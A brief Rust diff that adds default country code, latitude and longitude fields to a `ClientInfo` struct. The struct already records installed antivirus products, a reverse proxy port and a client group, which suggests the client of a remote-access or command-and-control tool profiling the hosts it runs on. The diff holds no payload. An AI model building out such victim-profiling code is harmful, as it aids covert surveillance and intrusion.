@@ -80,6 +80,13 @@ pub fn client_info(group: String) -> ClientInfo{
     s.refresh_cpu();
 
     let installed_avs = get_installed_avs();
+    
+    // Default geolocation values
+    let country_code = "N/A".to_string();
+    let latitude = 0.0;
+    let longitude = 0.0;
+    
+    // No blocking calls in this function - we'll fetch location asynchronously later if needed
 
     let client_data = ClientInfo {
         uuidv4: None,
@@ -97,6 +104,9 @@ pub fn client_info(group: String) -> ClientInfo{
         reverse_proxy_port: "".to_string(),
         installed_avs,
         disconnected: None,
+        country_code,
+        latitude,
+        longitude,
     };
 
     client_data
